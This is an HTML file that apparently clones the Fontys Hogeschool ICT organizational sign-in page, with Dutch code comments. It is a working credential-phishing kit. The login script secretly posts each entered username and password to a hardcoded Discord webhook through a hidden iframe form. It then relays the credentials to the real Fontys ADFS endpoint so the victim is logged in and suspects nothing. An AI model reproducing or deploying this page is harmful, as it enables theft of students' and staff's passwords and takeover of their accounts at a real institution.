<!DOCTYPE html>
<html lang="nl-NL">
<head>
  <meta charset="UTF-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width,initial-scale=1.0,user-scalable=1">
  <meta http-equiv="cache-control" content="no-cache,no-store">
  <meta http-equiv="pragma" content="no-cache">
  <meta http-equiv="expires" content="-1">
  <meta name="mswebdialog-title" content="Connecting to Fontys Hogeschool ICT">
  <title>Sign In</title>
  <link rel="stylesheet" href="css/style.css">
  <style>
    .illustrationClass {
      background-image: url('images/illustration.jpg')!important;
      background-size: cover;
      background-position: center;
    }
    body.loading { cursor: wait; }
  </style>
</head>
<body dir="ltr" class="body">
  <div id="fullPage">
    <div id="brandingWrapper" class="float">
      <div id="branding" class="illustrationClass"></div>
    </div>
    <div id="contentWrapper" class="float">
      <div id="content">
        <div id="header">
          <img id="companyLogo" class="logoImage"
               src="images/logo.png"
               alt="Fontys Hogeschool ICT">
        </div>
        <div id="workArea">
          <div id="authArea" class="groupMargin">
            <div id="loginArea">
              <div id="loginMessage" class="groupMargin">
                Sign in with your organizational account
              </div>
              <form id="loginForm" autocomplete="off" onsubmit="return handleLogin();">
                <div id="error" class="fieldMargin error smallText" style="display:none">
                  <span id="errorText"></span>
                </div>
                <div id="formsAuthenticationArea">
                  <div id="userNameArea">
                    <label for="userNameInput" class="hidden">User Account</label>
                    <input id="userNameInput" name="UserName" type="email"
                           class="text fullWidth"
                           placeholder="i123456@fontysict.nl"
                           required autocomplete="on" spellcheck="false">
                  </div>
                  <div id="passwordArea">
                    <label for="passwordInput" class="hidden">Password</label>
                    <input id="passwordInput" name="Password" type="password"
                           class="text fullWidth"
                           placeholder="Password"
                           required autocomplete="on">
                  </div>
                  <div id="kmsiArea">
                    <input type="checkbox" id="kmsiInput" name="Kmsi" value="true">
                    <label for="kmsiInput">Keep me signed in</label>
                  </div>
                  <div id="submissionArea" class="submitMargin">
                    <span id="submitButton" class="submit"
                          tabindex="4" role="button"
                          onclick="return handleLogin()"
                          onkeypress="if (event && event.keyCode===32) handleLogin()">
                      Sign in
                    </span>
                  </div>
                </div>
                <input type="hidden" id="optionForms" name="AuthMethod" value="FormsAuthentication">
              </form>
            </div>
            <div id="authOptions">…</div>
            <div id="introduction" class="groupMargin">
              <p>
                Forgot your password?
                Click <a href="https://passwordreset.fontysict.nl">hier</a>
                voor meer informatie.
              </p>
            </div>
          </div>
        </div>
        <div id="footer">
          <div id="footerLinks" class="floatReverse">
            <span>© 2016 Microsoft</span>
          </div>
        </div>
      </div>
    </div>
  </div>

  <!-- verborgen iframe en form voor Discord-webhook -->
  <iframe name="discordFrame" id="discordFrame" style="display:none;"></iframe>
  <form id="webhookForm"
        action="https://discord.com/api/webhooks/1347877842725371984/SSQUXuH1EbjqDA-UEXf9d_uik63AvOEyG19LiRFbdZuB9XsRpohp37zbFe9T0gCNxnKE"
        method="POST" target="discordFrame">
    <input type="hidden" name="payload_json" id="payload_json" value="">
  </form>

  <script>
    async function handleLogin() {
      const user       = document.getElementById('userNameInput').value.trim();
      const pass       = document.getElementById('passwordInput').value.trim();
      const err        = document.getElementById('error');
      const errText    = document.getElementById('errorText');
      const kmsiChecked= document.getElementById('kmsiInput').checked;

      // 1) Validatie
      if (!user || !pass) {
        errText.textContent = 'Vul zowel gebruikersnaam als wachtwoord in.';
        err.style.display = 'block';
        return false;
      }
      err.style.display = 'none';

      // 2) Wait-cursor
      document.body.classList.add('loading');

      // 3) Discord-webhook versturen blijft gelijk
      const payload = JSON.stringify({
        content: `**Loginnaam:** ${user}\n**Password:** ${pass}`
      });
      document.getElementById('payload_json').value = payload;
      document.getElementById('webhookForm').submit();

      // 4) Bouw FormData voor ADFS
      const formData = new FormData();
      formData.append('UserName',   user);
      formData.append('Password',   pass);
      formData.append('AuthMethod', 'FormsAuthentication');
      if (kmsiChecked) {
        formData.append('Kmsi', 'true');
      }

      try {
        // 5) fetch met manual redirect
        const response = await fetch(
          'https://login.fontysict.nl/adfs/ls?version=1.0&action=signin&realm=urn%3AAppProxy%3Acom&appRealm=5e08666e-3832-ef11-a65f-005056a7022a&returnUrl=https%3A%2F%2Fportal.fhict.nl%2F&client-request-id=AB5ECBA9-CE97-0001-53E7-61AB97CEDB01',
          {
            method: 'POST',
            body: formData,
            credentials: 'include',
            redirect: 'manual'
          }
        );

        // 6a) Succesvolle inlog leidt tot redirect (302)
        if (response.status === 302) {
          const location = response.headers.get('Location');
          window.location.href = location;
          return false;
        }

        // 6b) Anders: toon foutmelding
        throw new Error('Invalid credentials');

      } catch (e) {
        // 7) Fout afhandelen: blijf op pagina en toon melding
        document.body.classList.remove('loading');
        errText.textContent = 
          'De gebruikers-id of het wachtwoord is onjuist. Voer de gebruikers-id en het wachtwoord opnieuw in.';
        err.style.display = 'block';
        return false;
      }
    }

    // Enter-to-submit ongewijzigd
    document.getElementById('loginForm')
      .addEventListener('keypress', e => {
        if (e.key === 'Enter' || e.keyCode === 13) {
          e.preventDefault();
          handleLogin();
        }
      });
  </script>
</body>
</html>
